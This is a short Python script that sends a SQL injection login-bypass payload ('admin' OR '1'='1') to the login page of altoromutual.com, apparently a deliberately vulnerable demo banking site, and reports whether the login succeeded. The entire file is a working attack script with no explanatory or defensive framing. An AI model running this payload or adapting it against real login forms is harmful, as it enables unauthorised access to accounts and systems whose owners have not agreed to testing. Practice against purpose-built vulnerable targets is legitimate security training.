import requests
from bs4 import BeautifulSoup

# Define the target URL
url = 'http://altoromutual.com'
login_page = f"{url}/login.php"

# Headers for the POST request
headers = {
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3',
    'Content-Type': 'application/x-www-form-urlencoded'
}

# SQL injection payload
payload = {
    'username': "admin' OR '1'='1",  # This will always evaluate to true and log in as admin
    'password': 'password'
}

# Send the POST request to the login page
response = requests.post(login_page, headers=headers, data=payload)

# Check if we are logged in successfully
if "Welcome" in response.text:
    print("Logged In Successfully")
else:
    print("Failed to log in")